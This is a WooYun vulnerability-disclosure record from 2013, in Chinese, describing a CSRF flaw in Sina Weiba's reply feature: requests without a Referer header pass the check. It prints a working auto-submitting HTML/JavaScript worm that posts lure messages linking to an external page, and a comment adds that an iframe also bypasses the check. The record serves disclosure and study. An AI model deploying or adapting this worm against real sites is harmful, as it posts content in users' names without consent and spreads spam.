{"id": 14228, "wybug_id": "wooyun-2013-019597", "wybug_title": "新浪微吧首页蠕虫漏洞，绕过新浪referer限制的小技巧", "wybug_corp": "新浪微博", "wybug_author": "fox", "wybug_date": "2013-03-06 10:34", "wybug_open_date": "2013-03-06 10:57", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-03-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-03-06：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 新浪微博首页蠕虫 详细说明：  1、出问题的地方\nhttp://weiba.weibo.com\n2、微吧回复主题的时候， 进行了CSRF校验， 但是，其逻辑是如果header里没有referer，也算校验通过，估计是为了兼容关闭了referer的浏览器而这样3、但是，只要构造出不带referer的post页面，马上变成黑客手中的漏洞了4、比如在https跳转到http时就不会带referer，把攻击的蠕虫放在https的服务器上即可借用@风萧萧的代码，附一个简单的蠕虫\n<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /></head><body><form id=\"fxx\" name=\"fxx\" action=\"http://weiba.weibo.com/aj_re/add?__rnd=1362498869847\" method=\"POST\"><input type=\"text\" name=\"text\" id=\"content\" value=\"test\" /><input type=\"text\" name=\"tid\" value=\"3552602802252056\" /><input type=\"text\" name=\"pid\" value=\"\" /><input type=\"text\" name=\"forward\" value=\"1\" /><input type=\"text\" name=\"_t\" value=\"0\" /><input type=\"submit\" value=\"submit\" /></form><script>\tvar random=new Array();\trandom[0]=\"\";\trandom[1]=\"有帅哥哦\";\trandom[2]=\"有萝莉哦\";\trandom[3]=\"有小清新哦\";\trandom[4]=\"有女王哦\";\trandom[5]=\"有御姐哦\";\trandom[6]=\"有高帅富哦\";\trandom[7]=\"有女屌丝哦\";\trandom[8]=\"有美女哦\";\trandom[9]=\"有苍老师哦\";\tvar num =parseInt(Math.random()*10);\tvar constr=\"   follow me! https://xssed.me/csrf/weibo.html\";\tvar sendstr=random[num]+constr;\talert(sendstr);\tdocument.getElementById(\"content\").setAttribute(\"value\",sendstr);\tdocument.fxx.submit();</script></body></html>\n   漏洞证明：  1、微吧回帖地址\n\n2、去掉referer的post成功突破\n\n3、蠕虫发布到首页\n\n   修复方案：  来个礼物吧~   版权声明：转载请注明来源 fox@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-03-06 10:57 厂商回复：  哥 ,你的代码发不成功微博啊 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-03-06 10:51 |    \t\tfox \t\t\t( 普通白帽子  |\t\t\t        Rank:159 漏洞数:16        | fox)\t\t \n  谢谢 @xsser 帮忙改标题    \n     2013-03-06 11:00 |    \t\tfox \t\t\t( 普通白帽子  |\t\t\t        Rank:159 漏洞数:16        | fox)\t\t \n  @新浪微博 代码是一个示例， 需要放在https服务器即可生效。不过我没有申请https证书， 所以是一个示例， 里面的路径只是虚构的，厂商可以把他放到https服务器上测试    \n     2013-03-06 11:06 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  @fox 你碉堡了    \n     2013-03-06 11:12 |    \t\tfox \t\t\t( 普通白帽子  |\t\t\t        Rank:159 漏洞数:16        | fox)\t\t \n  https的目的只是为了不带referer， 根据RFC-2616，https到http跳转可以不带referer。新浪微博攻城狮们测试的时候， 可以把浏览器配置成不发送referer的形式来模拟， 不过记得改一下那份代码啊， 我是借用@风萧萧 的，url都没改呢， 直接跑自然不成功了    \n     2013-03-06 14:45 |    \t\t/fd \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:1        )\t\t \n  用iframe亦可绕过referer    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}